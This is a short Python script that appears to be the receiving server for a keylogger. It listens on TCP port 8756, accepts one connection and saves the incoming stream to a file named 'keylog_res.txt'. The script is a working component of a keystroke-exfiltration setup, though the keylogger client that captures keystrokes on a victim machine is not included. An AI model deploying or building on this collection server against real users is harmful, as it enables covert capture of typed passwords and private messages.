import socket

ssFT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssFT.bind((socket.gethostname(), 8756))
ssFT.listen(1)

conn, address = ssFT.accept()
print(address)

dir_path = './'
text_file = 'keylog_res.txt'
with open(dir_path+text_file, "wb") as f:
    data = conn.recv(1024)
    while data:
        f.write(data)
        data = conn.recv(1024)

ssFT.close()

print(f'\nThe data have been successfully saved in {dir_path+text_file}\n')